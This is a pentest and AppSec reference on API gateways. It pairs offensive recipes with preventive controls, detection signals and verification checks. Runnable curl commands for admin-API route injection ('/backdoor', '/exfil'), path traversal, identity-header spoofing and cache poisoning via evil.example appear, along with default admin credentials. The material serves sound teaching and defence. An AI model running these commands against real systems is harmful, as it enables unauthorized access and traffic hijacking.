# API Gateway

> An API gateway is the single entry point for a set of backend APIs. It routes requests, terminates TLS, authenticates callers, enforces rate limits, transforms payloads, and often aggregates multiple backend services into a single response. Common implementations: Kong, Tyk, Apache APISIX, AWS API Gateway, Azure API Management, Google Cloud API Gateway, Envoy Gateway, Traefik, nginx as a gateway.
>
> The gateway sits between the internet and the application, and this position gives it a specific set of security properties. A correctly configured gateway centralizes authentication and rate limiting, so individual services do not have to implement them. A misconfigured gateway becomes the weakest link: it can pass unauthenticated requests to backends, allow route confusion (matching the wrong backend), leak internal service names through verbose errors, and become a vector for SSRF if it accepts upstream URLs from clients.
>
> This file covers API gateways from both sides: the pentest track (detection, route confusion, auth bypass) and the AppSec track (configuration model, controls, verification).
>
> Production context tags: [LAB] HTB/OSCP labs only, [PROD] safe for production, [PROD-RISK] use with care, [PROD-NO] do not run against production.

## Table of Contents

1. [What an API Gateway Is](#1-what-an-api-gateway-is)
2. [Detection](#2-detection)
3. [Enumeration](#3-enumeration)
4. [Attack Surface Map](#4-attack-surface-map)
5. [Common Variants](#5-common-variants)
6. [Exploitation Recipes](#6-exploitation-recipes)
7. [Post-Exploitation](#7-post-exploitation)
8. [Risk Context (AppSec)](#8-risk-context-appsec)
9. [Root Causes (AppSec)](#9-root-causes-appsec)
10. [Preventive Controls (AppSec)](#10-preventive-controls-appsec)
11. [Detection Controls (AppSec)](#11-detection-controls-appsec)
12. [Verification (AppSec)](#12-verification-appsec)
13. [OSCP Notes](#13-oscp-notes)
14. [Production Notes](#14-production-notes)
15. [References](#15-references)

---

## 1. What an API Gateway Is

An API gateway is a reverse proxy specialized for APIs. It sits between clients and backend services and provides:

- **Routing** - map incoming URLs to backend services.
- **TLS termination** - handle HTTPS, certificates, and HSTS.
- **Authentication** - validate tokens, API keys, mTLS certificates.
- **Authorization** - coarse-grained policies per route or consumer.
- **Rate limiting** - per-consumer, per-route, per-IP.
- **Request/response transformation** - header rewrite, body transform, protocol translation (HTTP to gRPC).
- **Observability** - access logs, metrics, tracing.
- **Caching** - for cacheable endpoints.
- **Load balancing** - distribute traffic across backend instances.

### 1.1 Common implementations

```text
Open source:
  Kong              (nginx + Lua)
  Tyk               (Go)
  Apache APISIX     (nginx + etcd)
  Envoy Gateway     (Envoy + Kubernetes CRDs)
  Traefik           (Go, Kubernetes-native)
  KrakenD           (Go, declarative)
  nginx (as gateway, hand-rolled)

Cloud:
  AWS API Gateway
  Azure API Management
  Google Cloud API Gateway / Apigee
  Cloudflare API Shield

Service mesh sidecars:
  Envoy, Linkerd, Istio Ingress
```

### 1.2 The "trust boundary" model

The gateway is the trust boundary. Everything behind it is "internal"; everything in front is "untrusted." This model is correct only if:

1. The gateway validates every request.
2. Backend services trust only requests that come from the gateway.
3. No path exists from the internet to a backend that bypasses the gateway.

When any of these fail, the security model collapses. The most common failure is #3 - a backend service is accidentally exposed on a public IP or a public DNS name, and clients reach it directly.

### 1.3 Gateway-level auth

Typical gateway-level authentication:

- **API key validation.** The gateway looks up the key in a store and attaches identity headers (`X-Consumer-ID`, `X-Consumer-Username`).
- **JWT validation.** The gateway verifies the signature and claims, then forwards the decoded identity in headers.
- **mTLS.** The gateway validates the client certificate against a CA, then forwards the subject DN.
- **OAuth introspection.** The gateway calls the authorization server to validate an opaque token.

The gateway then passes identity to the backend as headers. The backend is expected to trust these headers. If the backend is reachable without going through the gateway, an attacker can set these headers directly.

---

## 2. Detection

API gateways are detected by:

- Response headers characteristic of the gateway (`Server: kong`, `Server: Tyk`, `x-amzn-RequestId`).
- A single hostname that fronts many different backend services (identifiable by response formats, cookies, error pages).
- Consistent rate limiting across unrelated endpoints.
- `X-Forwarded-*` headers in responses or reflected in errors.
- Gateway-specific admin endpoints (`/admin`, `:8001` for Kong admin API, `:8080` for Tyk dashboard).

### Quick detection

```bash
# Look at response headers
curl -sI "http://$TARGET/api/" | grep -iE "server|x-amz|x-kong|tyk|envoy|traefik|apisix"

# Probe common gateway admin ports
for port in 8001 8002 8080 9000 9901; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET:$port/")
  echo "$port: $code"
done
```

Expected output (Kong):

```text
Server: kong/3.4.0
X-Kong-Upstream-Latency: 12
X-Kong-Proxy-Latency: 1
```

### Quick reference table

| Signal | Meaning | Next step |
|--------|---------|-----------|
| `Server: kong` | Kong gateway | Try `:8001` admin API |
| `Server: Tyk` | Tyk gateway | Try `:8080` dashboard |
| `x-amzn-RequestId` | AWS API Gateway | Look for stage names, `/prod`, `/dev` |
| `x-envoy-*` | Envoy | Check for admin port 9901 |
| `server: APISIX` | APISIX | Check `:9090` admin API (if misconfigured) |
| `X-Forwarded-For`, `X-Real-IP` echoed | Misconfig | Test header spoofing |
| Single host, many backends | Gateway | Enumerate routes |
| Consistent rate limit across unrelated endpoints | Gateway | Look for a bypass path |
| Verbose error with service name | Internal leak | Note service names for lateral recon |

---

## 3. Enumeration

### 3.1 Route enumeration

Gateways route by path prefix, hostname, header, or method. Enumerate paths that map to different backends:

```bash
# Common gateway route prefixes
paths=(
  /api/
  /api/v1/
  /api/v2/
  /v1/
  /v2/
  /service1/
  /service2/
  /auth/
  /users/
  /admin/
  /internal/
  /_internal/
  /debug/
  /swagger/
  /openapi.json
)
for p in "${paths[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET$p")
  echo "$p -> $code"
done
```

Look for endpoints that respond differently (200, 401, 403) - they exist.

### 3.2 Backend service discovery

Gateways often leak backend service names through:

- **Verbose error pages** ("upstream connect error ... service: users-api:8080").
- **`X-Forwarded-Host` and `X-Forwarded-Server`** headers in responses.
- **Swagger / OpenAPI specs** aggregated by the gateway (`/openapi.json`, `/swagger-ui/`).
- **Route listings** in the admin API (if exposed).

```bash
# Try to trigger upstream errors
curl -s "http://$TARGET/api/v1/nonexistent-long-path" -I | grep -iE "server|x-upstream|trace"
curl -s "http://$TARGET/api/v1/../../etc/passwd" -I | grep -iE "server|x-upstream"
```

### 3.3 Admin API discovery

Gateway admin APIs are high-value targets. They can list routes, modify routing, read consumer data, and sometimes execute scripts.

```bash
# Kong admin API (default port 8001)
curl -s "http://$TARGET:8001/" | head
curl -s "http://$TARGET:8001/routes"
curl -s "http://$TARGET:8001/services"
curl -s "http://$TARGET:8001/consumers"

# APISIX admin API (default port 9090)
curl -s "http://$TARGET:9090/apisix/admin/routes" -H "X-API-KEY: <key>"

# Traefik API (default port 8080)
curl -s "http://$TARGET:8080/api/rawdata"
curl -s "http://$TARGET:8080/api/http/routers"

# Envoy admin (default port 9901)
curl -s "http://$TARGET:9901/config_dump"
curl -s "http://$TARGET:9901/clusters"
curl -s "http://$TARGET:9901/server_info"
```

A misconfigured gateway with an exposed admin API is usually a direct path to full compromise.

### 3.4 Path traversal and route normalization

Gateways and backends sometimes normalize paths differently. Test:

```bash
# Traversal
curl -s "http://$TARGET/api/v1/../../admin"
curl -s "http://$TARGET/api/v1/%2e%2e/%2e%2e/admin"
curl -s "http://$TARGET/api/v1/..%2f..%2fadmin"

# Case variations
curl -s "http://$TARGET/API/v1/users"
curl -s "http://$TARGET/Api/V1/Users"

# Trailing slash
curl -s "http://$TARGET/api/v1/users/"
curl -s "http://$TARGET/api/v1/users"
```

If the gateway matches one path to an "authenticated route" but the backend normalizes to a different path, the auth check may be bypassed.

### 3.5 Header-based routing

Some gateways route by header (`X-API-Version`, `Host`, `X-Service`). Test by adding or changing headers:

```bash
curl -s "http://$TARGET/" -H "X-API-Version: 2"
curl -s "http://$TARGET/" -H "Host: internal.users.svc"
curl -s "http://$TARGET/" -H "X-Service: admin"
```

If the response differs, the gateway is routing by header, and header values are attacker-controlled unless validated.

---

## 4. Attack Surface Map

| Layer | Vector | What to test |
|-------|--------|--------------|
| Gateway admin | Exposed admin API | Default ports (8001, 8080, 9090, 9901) |
| Gateway admin | Default credentials | `admin:admin`, `admin:changeme` |
| Routing | Route confusion | Path normalization, case, trailing slash |
| Routing | Header-based routing | `Host`, `X-API-Version`, `X-Service` |
| Auth | Gateway vs backend mismatch | Paths that bypass gateway auth but reach the backend |
| Auth | Identity header trust | Backend trusts `X-Consumer-ID`, `X-User-ID` |
| Auth | JWT validation skip | Routes that forward tokens without validation |
| Rate limit | Bypass via direct backend | Backend has no limit if reachable directly |
| TLS | Downgrade | HTTP accepted alongside HTTPS |
| SSRF | Upstream URL from client | `X-Forwarded-Host` used to build URLs |
| SSRF | Webhook from gateway | Gateway forwards to attacker-controlled URL |
| Transformation | Header injection | CRLF in header values |
| Transformation | Body rewrite | XML/SOAP/JSON transformation injection |
| Caching | Cache poisoning | `X-Forwarded-Host` unkeyed in cache |
| Caching | Cache deception | `;.css`, `;.js` appended to private paths |
| Logging | Verbose errors | Service names, IPs, internal paths |
| Protocol | HTTP/1 to HTTP/2 | Smuggling via upgrade |
| Protocol | gRPC-Web | CORS misconfig on gateway |

---

## 5. Common Variants

### 5.1 Exposed gateway admin API

Kong admin API on `:8001`, APISIX on `:9090`, Traefik on `:8080`, Envoy on `:9901`. No auth by default in many deployments. Full read/write access to the gateway configuration.

```bash
# Kong: list all routes, then add a new one
curl -s "http://$TARGET:8001/routes"
curl -s -X POST "http://$TARGET:8001/routes" \
  -d "paths[]=/backdoor" \
  -d "service.id=<service-id>"
```

**CWE-306:** Missing Authentication for Critical Function. **OWASP 2021:** A05 Security Misconfiguration.

### 5.2 Route confusion (gateway vs backend path normalization)

The gateway matches `/api/v1/*` to an authenticated backend route. The backend normalizes `..` and reaches `/admin`. The gateway allowed the request because the path prefix matched; the backend executes an admin action.

```bash
# Gateway sees /api/v1/.. and treats it as allowed
# Backend normalizes to /admin and executes
curl -s "http://$TARGET/api/v1/../../admin/users"
curl -s "http://$TARGET/api/v1/%2e%2e/%2e%2e/admin/users"
```

**CWE-436:** Interpretation Conflict. **OWASP 2021:** A01 Broken Access Control, A05.

### 5.3 Direct backend bypass

The gateway enforces auth, rate limit, and WAF. The backend service is also reachable on a public IP or a public DNS name (e.g. `users-api.internal.example.com` resolves to a public IP, or the service is exposed via a separate cloud load balancer). An attacker reaches the backend directly, bypassing all gateway controls.

```bash
# Discover the backend's real address (DNS history, TLS cert transparency, error messages)
dig users-api.internal.example.com

# Call it directly with a spoofed identity header
curl -s "http://users-api.internal.example.com/api/admin" \
  -H "X-Consumer-ID: admin" \
  -H "X-User-Role: admin"
```

This is the single most damaging gateway vulnerability. It is also one of the most common.

**CWE-441:** Unintended Proxy or Intermediary. **OWASP 2021:** A05, A01.

### 5.4 Identity header trust

The gateway sets `X-Consumer-ID`, `X-User-ID`, `X-User-Role` after validating auth. The backend trusts these headers without checking that the request came from the gateway. If the backend is reachable directly, an attacker sets the headers and impersonates any user.

**CWE-290:** Authentication Bypass by Spoofing. **OWASP 2021:** A01, A07.

### 5.5 Auth skip on specific routes

Certain routes are public by design (`/health`, `/metrics`, `/api/v1/public/*`). If the public route is more permissive than the developer intended (e.g. `/api/v1/public/../admin`), the auth skip can be exploited.

```bash
# Test whether the skip pattern matches more than intended
curl -s "http://$TARGET/api/v1/public/../admin"
curl -s "http://$TARGET/api/v1/public/%2e%2e/admin"
```

**CWE-436.** **OWASP 2021:** A01.

### 5.6 Verbose error pages leak internal topology

The gateway returns a detailed error with upstream service names, IP addresses, versions. Useful for reconnaissance.

```text
502 Bad Gateway
upstream connect error or disconnect/reset before headers. reset reason: connection failure
  service: users-api.prod.svc.cluster.local:8080
  cluster: users-api
```

**CWE-200:** Exposure of Sensitive Information. **OWASP 2021:** A05.

### 5.7 SSRF via client-controlled upstream URL

Some gateways accept an upstream URL from the request (e.g. for webhooks, or proxy-as-a-service features). If the URL is attacker-controlled and not validated against an allowlist, the gateway becomes an SSRF vector - often with elevated network access.

**CWE-918:** SSRF. **OWASP 2021:** A10.

### 5.8 Cache poisoning via X-Forwarded-Host

The gateway caches by URL only, but the response body is built using `X-Forwarded-Host`. An attacker sends a request with `X-Forwarded-Host: evil.example`, the response includes `https://evil.example/...` in the body, and the cache stores it for all users.

**CWE-444 / CWE-436.** **OWASP 2021:** A05.

### 5.9 Gateway TLS downgrade

The gateway accepts both HTTP and HTTPS. Clients that use HTTP get redirected, but the redirect happens after the credentials are sent in cleartext. The correct configuration is to refuse HTTP on the same port and to serve HTTP only on a redirect port with HSTS.

**CWE-319.** **OWASP 2021:** A02.

### 5.10 Default admin credentials

Kong, Tyk, and many self-hosted gateways ship with default credentials for their admin UI (`admin`/`admin`, `admin`/`changeme`). These are frequently unchanged in production.

**CWE-798:** Use of Hard-coded Credentials. **OWASP 2021:** A05, A07.

### 5.11 Header injection via transformation

Gateway transformation rules that rewrite headers can be tricked into injecting CRLF if the input is not sanitized. Modern gateways sanitize by default; legacy configurations may not.

**CWE-113:** HTTP Response Splitting. **OWASP 2021:** A03.

### 5.12 HTTP/2 to HTTP/1 downgrade smuggling

The gateway speaks HTTP/2 to the client and HTTP/1.1 to the backend. A malicious HTTP/2 request with a `Content-Length` header and a request body can be smuggled to the backend as two requests. Applies to gateways that do not sanitize CL/TE on the downgrade.

**CWE-444.** **OWASP 2021:** A03, A05.

---

## 6. Exploitation Recipes

### 6.1 Exposed Kong admin API to route injection

1. Detect Kong by the `Server: kong` response header.
2. Probe the admin API on the default port.

```bash
curl -s "http://$TARGET:8001/" | head
```

3. List services and routes.

```bash
curl -s "http://$TARGET:8001/services" | python3 -m json.tool
curl -s "http://$TARGET:8001/routes" | python3 -m json.tool
```

4. Add a new route that points to an internal service the attacker wants to reach. For example, route `/exfil` to an internal admin service.

```bash
# (Simplified - real payload depends on the Kong version and existing services)
curl -s -X POST "http://$TARGET:8001/routes" \
  --data "name=exfil" \
  --data "paths[]=/exfil" \
  --data "service.id=<internal-admin-service-id>"
```

5. Reach the internal service via `/exfil`.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### 6.2 Route confusion to admin

1. Identify an authenticated route prefix.

```bash
curl -s -o /dev/null -w "%{http_code}\n" "http://$TARGET/api/v1/users"
# 200
curl -s -o /dev/null -w "%{http_code}\n" "http://$TARGET/admin/users"
# 403
```

2. Try path normalization tricks that the gateway allows but the backend interprets differently.

```bash
curl -s "http://$TARGET/api/v1/../admin/users"
curl -s "http://$TARGET/api/v1/%2e%2e/admin/users"
curl -s "http://$TARGET/api/v1/users/../../admin/users"
curl -s "http://$TARGET/api/v1/users%2f..%2f..%2fadmin/users"
```

3. If any returns 200 with admin data, the gateway normalizes paths differently than the backend.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### 6.3 Direct backend bypass with identity header spoofing

1. Find the backend's real address. Sources: DNS history (SecurityTrails, crt.sh), TLS certificates, error pages, `X-Forwarded-Server` responses, or brute-force of common service names.

```bash
# Certificate transparency reveals service names
curl -s "https://crt.sh/?q=%25.example.com&output=json" | python3 -m json.tool | grep name_value
```

2. Call the backend directly, bypassing the gateway.

```bash
curl -s "http://users-api.internal.example.com/api/admin" \
  -H "X-Consumer-ID: 1" \
  -H "X-User-Role: admin" \
  -H "X-User-ID: 1"
```

3. If the backend trusts these headers, the attacker has admin access without going through the gateway's auth.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### 6.4 Verbose error page to internal topology

1. Trigger an upstream error.

```bash
curl -s "http://$TARGET/api/v1/nonexistent-force-error"
curl -s "http://$TARGET/api/v1/%00"
```

2. Parse the error for service names, IPs, ports, versions.

```text
service: users-api.prod.svc.cluster.local:8080
cluster: users-api
upstream: 10.0.5.42
```

3. Use the topology for lateral movement.

### 6.5 Cache poisoning via X-Forwarded-Host

1. Send a request with `X-Forwarded-Host: evil.example`.

```bash
curl -s "http://$TARGET/api/v1/config" -H "X-Forwarded-Host: evil.example"
```

2. Observe if the response body contains `https://evil.example` links.

3. If yes, the response is likely cached. Check with a second request without the header.

```bash
curl -s "http://$TARGET/api/v1/config"
# If the body still contains evil.example, the cache is poisoned
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## 7. Post-Exploitation

Once the gateway is compromised:

- **Full routing control.** If the admin API is writable, the attacker can route paths to any reachable backend, including internal-only services.
- **Credential harvesting.** The gateway sees every request; a compromised gateway can log Authorization headers, JWTs, API keys.
- **Backend impersonation.** Identity header injection allows impersonating any consumer.
- **TLS interception.** If the gateway is compromised, the attacker sees all decrypted traffic.
- **Lateral movement via SSRF.** Gateways usually have network access to internal services. An SSRF via a gateway reaches further than an SSRF via a normal app.
- **Denial of service.** Route all traffic to a black hole, or inject config that breaks routing.

For the report: what the gateway exposed, what was reachable through it, what bypasses were possible.

---

## 8. Risk Context (AppSec)

Gateway vulnerabilities map to:

| Standard | Gateway-specific manifestation |
|----------|--------------------------------|
| OWASP 2021 A01 Broken Access Control | Route confusion, identity header trust, backend bypass |
| OWASP 2021 A02 Cryptographic Failures | TLS downgrade on gateway, HTTP alongside HTTPS |
| OWASP 2021 A03 Injection | CRLF in header transformation, smuggling on downgrade |
| OWASP 2021 A05 Security Misconfiguration | Exposed admin API, default credentials, verbose errors |
| OWASP 2021 A07 Auth Failures | Missing auth on admin API, permissive gateway-level auth |
| OWASP 2021 A10 SSRF | Client-controlled upstream, `X-Forwarded-Host` |
| OWASP API 2023 API1 BOLA | Route confusion reaching peer resources |
| OWASP API 2023 API5 BFLA | Auth skip on a public route that reaches a privileged one |
| OWASP API 2023 API8 Security Misconfiguration | All gateway misconfig classes |

---

## 9. Root Causes (AppSec)

Recurring root causes for gateway vulnerabilities:

1. **Admin API exposed.** Gateways bind admin APIs to `0.0.0.0` for convenience. In container orchestration, "internal" is often not internal because the network is flat.
2. **Default credentials.** Admin UIs and APIs ship with defaults; production deployments do not always change them.
3. **Backend directly reachable.** The gateway is deployed, but the backend is also exposed on a public IP, public DNS name, or a second load balancer. This is the security model collapse point.
4. **Trusting identity headers.** The backend trusts `X-Consumer-ID`, `X-User-ID` without verifying the source. If the backend is reachable directly, this is identity spoofing.
5. **Path normalization mismatch.** The gateway normalizes `/api/v1/../admin` differently than the backend. Auth checks on the gateway do not protect the backend path the backend actually serves.
6. **Auth skip patterns.** Routes marked "public" use prefix matching that also matches unintended paths.
7. **Verbose errors.** Detailed errors with service names, IPs, and versions leak the internal topology.
8. **Client-controlled upstream.** Any feature that lets the client specify where the gateway forwards to must have strict allowlist validation.

---

## 10. Preventive Controls (AppSec)

**Admin plane:**

- **Bind admin API to localhost or an internal interface only.** Never `0.0.0.0`.
- **Require authentication on the admin API.** No default credentials; strong keys, rotatable.
- **Network-segment the admin plane.** Separate VLAN, separate authentication, separate audit log.
- **Alert on admin API access.** Admin API calls are rare and should be logged and monitored.

**Data plane:**

- **Prevent backend bypass.** Backends must be reachable only from the gateway. Enforce at the network layer: security groups, Kubernetes NetworkPolicy, private subnets, service mesh mTLS.
- **Never expose a backend on a public IP or public DNS name.** If a backend is reachable directly, the gateway provides no security.
- **Reject identity headers from external sources.** The gateway strips `X-Consumer-ID`, `X-User-ID`, `X-User-Role`, `X-Forwarded-*` from incoming requests and re-adds them after authentication. A request arriving at the backend without the gateway's mTLS certificate or sidecar identity must be rejected.
- **Path normalization consistency.** The gateway and the backend must agree on how paths are normalized before matching. Test both with the same set of inputs.
- **Auth skip patterns use exact match, not prefix.** A "public" route must match exactly the intended URL.

**Transformation and caching:**

- **Sanitize header values** on transformation rules (strip CRLF, allowlist characters).
- **Cache key includes all request attributes used to build the response** (`Host`, `X-Forwarded-Host`, `Accept-Language`, etc.). Otherwise cache poisoning is trivial.
- **Reject unexpected headers** where possible.

**TLS:**

- **HTTPS-only on the data plane.** Plain HTTP either refused or redirected with HSTS.
- **Strong TLS configuration** (1.2+, modern ciphers, no renegotiation).

**Observability:**

- **Verbose errors disabled in production.** Return generic 502/503 with a correlation ID; log the detail server-side.
- **Alert on admin API access, on sudden route changes, on 5xx spikes.**

---

## 11. Detection Controls (AppSec)

Signals worth monitoring:

- **Admin API access** from non-expected source IPs.
- **Admin API route changes** (new routes, modified upstreams) - this should be a rare event tied to a deployment.
- **Default credentials** attempted on the admin UI.
- **Path traversal patterns** in request paths (`..`, `%2e%2e`, mixed encodings).
- **`X-Forwarded-Host`, `X-Forwarded-For`** set to unusual values.
- **Identity headers** (`X-Consumer-ID`, `X-User-ID`) present in requests arriving at the gateway (they should be stripped).
- **Backend services** with inbound connections not originating from the gateway.
- **Cache miss rates** that spike after a cache-poisoning attempt.
- **Verbose error page** access patterns.

---

## 12. Verification (AppSec)

Concrete checks:

| Control | Verification |
|---------|--------------|
| Admin API not exposed | `curl http://gateway:8001/` (from outside) returns connection refused or 401 |
| Admin API auth | `curl http://gateway:8001/routes` without credentials returns 401 |
| No default credentials | `admin/admin` and `admin/changeme` rejected |
| Backend not reachable directly | `curl http://users-api.example.com/` returns connection refused or requires mTLS |
| Identity headers stripped | Send `X-Consumer-ID: admin`; the gateway must strip it before forwarding |
| Path normalization | Send `/api/v1/../admin`; expect 404 or 403, not the admin resource |
| Auth skip exact match | Send `/api/v1/public/../admin`; expect 404 or 403 |
| Header injection | Send a header with CRLF; expect rejection |
| Cache key includes Host | Send `X-Forwarded-Host: evil`; expect the cached response not to include it |
| TLS enforced | `curl http://gateway/api/...` returns 301 to HTTPS, no plaintext response |
| Verbose errors disabled | Trigger a 502; expect a generic page, not a service name |

Cross-reference: OWASP ASVS 4.0 V1 (Architecture), V4 (Access Control), V7 (Error Handling), V9 (Communications), V14 (Configuration). OWASP API Security Top 10:2023 API5, API8. See `../../01 Web/09 OWASP Top 10/A01-Broken-Access-Control.md` for route confusion and `../../01 Web/08 Vulnerabilities/SSRF.md` for the gateway-SSRF path.

---

## 13. OSCP Notes

API gateways appear on HTB boxes with microservice architectures:

- **Identify the gateway.** Response headers (`Server: kong`, `x-envoy-*`, `x-amzn-RequestId`).
- **Probe admin ports.** `8001` (Kong), `8080` (Traefik), `9090` (APISIX), `9901` (Envoy). If the admin API responds, you likely own the routing.
- **Look for verbose errors.** Trigger a 502; the error may leak backend service names and IPs.
- **Test path normalization.** `/api/v1/../admin`, `%2e%2e`, mixed. Cheap, sometimes wins.
- **Look for the backend's real address.** Certificate transparency (`crt.sh`), DNS history, error pages. If you can reach the backend directly, the gateway auth is irrelevant.
- **Try identity headers.** `X-Consumer-ID`, `X-User-ID`, `X-User-Role` on requests to the backend or gateway. Some gateways do not strip incoming ones.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## 14. Production Notes

| Practice | Verdict |
|----------|---------|
| Admin API bound to localhost / internal only | Required |
| Admin API authenticated (no defaults) | Required |
| Admin API audit-logged | Required |
| Backend reachable only from the gateway | Required |
| Identity headers stripped on ingress | Required |
| Path normalization consistent gateway/backend | Required |
| Public route patterns exact-match | Required |
| Cache key includes Host and X-Forwarded-Host | Required |
| Header sanitization on transformation | Required |
| HTTPS-only on data plane | Required |
| Verbose errors disabled | Required |
| Alert on admin API access | Recommended |
| Alert on route changes | Recommended |
| Gateway admin API on `0.0.0.0` | Never |
| Default admin credentials | Never |
| Backend on public IP or public DNS | Never |
| Trusting `X-Consumer-ID` from internet | Never |

---

## 15. References

- Kong Gateway documentation: https://docs.konghq.com/gateway/latest/
- Kong admin API: https://docs.konghq.com/gateway/latest/admin-api/
- Apache APISIX: https://apisix.apache.org/docs/apisix/getting-started/
- Traefik: https://doc.traefik.io/traefik/
- Envoy Gateway: https://gateway.envoyproxy.io/
- AWS API Gateway security: https://docs.aws.amazon.com/apigateway/latest/developerguide/security.html
- Azure API Management security: https://learn.microsoft.com/en-us/azure/api-management/security-baseline
- OWASP API Security Top 10:2023 API8 Security Misconfiguration: https://owasp.org/API-Security/editions/2023/en/0x11-t10/
- OWASP Top 10:2021 A05 Security Misconfiguration: https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
- OWASP ASVS 4.0: https://owasp.org/www-project-application-security-verification-standard/
- CWE-306 Missing Authentication for Critical Function: https://cwe.mitre.org/data/definitions/306.html
- CWE-436 Interpretation Conflict: https://cwe.mitre.org/data/definitions/436.html
- CWE-441 Unintended Proxy or Intermediary: https://cwe.mitre.org/data/definitions/441.html
- CWE-290 Authentication Bypass by Spoofing: https://cwe.mitre.org/data/definitions/290.html
- CWE-200 Exposure of Sensitive Information: https://cwe.mitre.org/data/definitions/200.html
- CWE-918 SSRF: https://cwe.mitre.org/data/definitions/918.html
- CWE-444 Inconsistent Interpretation of HTTP Requests: https://cwe.mitre.org/data/definitions/444.html
- CWE-319 Cleartext Transmission: https://cwe.mitre.org/data/definitions/319.html
- CWE-798 Hard-coded Credentials: https://cwe.mitre.org/data/definitions/798.html
- CWE-113 HTTP Response Splitting: https://cwe.mitre.org/data/definitions/113.html